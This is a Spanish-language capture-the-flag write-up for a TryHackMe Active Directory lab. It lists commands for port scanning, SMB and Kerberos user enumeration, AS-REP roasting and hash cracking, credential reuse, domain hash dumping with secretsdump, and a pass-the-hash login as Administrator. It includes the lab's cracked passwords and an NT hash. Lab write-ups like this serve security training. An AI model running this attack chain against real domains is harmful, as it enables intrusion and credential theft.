https://tryhackme.com/r/room/attacktivedirectory
# Fase de reconocimiento
Windows
## Buscamos puertos abiertos
```
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.209.100
```
![[Pasted image 20240605175535.png]]
## Reconocimiento de servicios
```
nmap -sCV -p53,80,88,135,139,445,464,3269,3389,49664,49665,49667,49669,49671 10.10.209.100
```
![[Pasted image 20240605174129.png]]
## Enumeration SMB
```
nmap --script "rdp-enum-encryption or rdp-ntlm-info" -p3389 -T4 10.10.209.100
```
![[Pasted image 20240605174712.png]]
```
enum4linux -a spookysec.local
```
![[Pasted image 20240605180741.png]]
![[Pasted image 20240605180811.png]]
## kerberos enumeracion ususarios
Nos descargamos la tool y descargamos un userlist dado
```
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
```
![[Pasted image 20240605223652.png]]
# Fase de ataque
Conseguimos un TGT (Ticket) de un usuario para intentar crackearlo
```
impacket-GetNPUsers -request -format john -no-pass spookysec.local/svc-admin
```
![[Pasted image 20240605223959.png]]
Crakeamos con John
```
john --wordlist=passwordlist.txt hash.txt
```
![[Pasted image 20240605224238.png]]
Vemos si funciona
```
crackmapexec smb spookysec.local -u 'svc-admin' -p 'management2005'
```
![[Pasted image 20240605224648.png]]
## SMB
Listamos shares compartidas
```
crackmapexec smb spookysec.local -u 'svc-admin' -p 'management2005' --shares
```
![[Pasted image 20240605225056.png]]
Vemos la share de backup
```
smbclient \\\\spookysec.local\\backup -U svc-admin --password="management2005"
```
Contiene las credenciales de backup
```
	get <archivo>
```
![[Pasted image 20240605225536.png]]
Comprobamos la contraseña
```
base64 -d backup_credentials.txt
```
```
crackmapexec smb spookysec.local -u 'backup' -p 'backup2517860'
```
![[Pasted image 20240605230804.png]]
## PassTheHash
El usuario backup tiene permiso para sacar los hashes
```
impacket-secretsdump -just-dc backup@spookysec.local
```
![[Pasted image 20240605230904.png]]
Copiamos el NTHash
```
0e0363213e37b94221497260b0bcb4fc
```
Comprobamos
![[Pasted image 20240607193036.png]]
Nos conectamos con el hash
```
evil-winrm -ip spookysec.local -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc
```
[+] ==pwned!==

